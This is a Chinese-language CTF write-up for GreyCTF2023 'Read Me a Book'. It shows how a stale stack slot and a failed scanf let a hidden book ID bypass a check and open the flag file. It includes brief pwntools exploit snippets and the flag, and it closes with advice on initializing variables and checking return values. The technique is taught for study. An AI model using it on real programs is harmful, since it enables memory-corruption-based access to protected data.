# GreyCTF2023 Read Me a Book

## 题目简述

程序有“阅读书籍”和“提交反馈”两个功能。隐藏编号 1337 会打开 `books/flag.txt`，但直接输入时会触发阻止逻辑。漏洞来自两个函数复用相同大小的栈帧：反馈函数把 `read()` 返回长度保存到 `rbp-0x34`，书籍菜单又把未初始化的选择变量放在同一偏移。

## 解题过程

先选择提交反馈，精确发送 1337 字节。`read` 的返回值为 `0x539`，随后写入反馈函数的局部变量槽：

```python
io.sendlineafter(b"Option: ", b"2")
io.sendafter(b"feedback: ", b"A" * 0x539)
```

返回主菜单后选择阅读书籍。书籍函数调用 `scanf("%d", &choice)`；此时提交非数字字符，使 `scanf` 返回 0 且不修改目标内存：

```python
io.sendlineafter(b"Option: ", b"1")
io.sendlineafter(b"> ", b"x")
```

由于新的调用帧复用了旧栈内容，`choice` 仍是 1337。直接输入 1337 的拦截条件依赖 `scanf` 成功，因此这次不会触发；函数返回未初始化值，后续读取函数打开隐藏书籍并输出：

```text
grey{librarian_f0rg0t_t0_1n1t_s7ack_9a3d5e8}
```

## 方法总结

未初始化局部变量的值并非随机，而是取决于此前使用过的栈内容。本题通过控制前一个函数的 `read` 长度，稳定布置下一函数的选择值；再让 `scanf` 解析失败，保留该旧值。所有输入解析都应检查返回值，并在读取前初始化目标变量，不能在失败路径继续使用它。
